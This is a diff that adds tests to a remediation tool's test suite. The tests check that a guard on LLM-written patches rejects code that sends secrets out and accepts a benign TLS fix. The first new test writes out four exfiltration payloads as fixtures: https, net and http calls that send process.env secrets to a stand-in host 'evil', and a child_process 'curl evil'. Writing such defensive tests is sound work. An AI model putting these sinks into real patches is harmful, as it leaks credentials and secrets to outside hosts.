@@ -104,6 +104,44 @@ test("an LLM patch that rewrites too much is rejected (blast-radius guard)", asy
   assert.match(res.rejected[0].reason, /too broad|changes \d+ lines/);
 });
 
+test("exfil guard rejects node:-prefixed and static-import sinks (audit-verified bypasses)", async () => {
+  const exploits = [
+    "require('node:https').request('https://evil/x?d=' + process.env.SECRET);\n",
+    "import { connect } from 'node:net';\nconnect(1, 'evil').end(process.env.TOKEN);\n",
+    "import http from 'https';\nhttp.get('https://evil/' + process.env.KEY);\n",
+    "const cp = require('node:child_process');\ncp.execSync('curl evil');\n",
+  ];
+  for (const newContent of exploits) {
+    const res = await remediateFindings([tlsFinding()], {
+      readContent: () => LEGACY,
+      patchSource: () => ({
+        path: "server.ts",
+        newContent,
+        ruleId: "tls-legacy-version",
+        source: "llm",
+      }),
+      policy,
+    });
+    assert.equal(res.applied.length, 0, `should reject: ${newContent}`);
+    assert.match(res.rejected[0].reason, /sink/i);
+  }
+});
+
+test("exfil guard still allows a benign localized PQC fix", async () => {
+  const res = await remediateFindings([tlsFinding()], {
+    readContent: () => LEGACY,
+    patchSource: () => ({
+      path: "server.ts",
+      newContent: "const opts = { minVersion: 'TLSv1.3' };\n",
+      ruleId: "tls-legacy-version",
+      source: "llm",
+    }),
+    policy,
+  });
+  assert.equal(res.applied.length, 1);
+  assert.equal(res.rejected.length, 0);
+});
+
 test("a small, sink-free LLM patch that clears the finding is still applied", async () => {
   const good: Patch = {
     path: "server.ts",
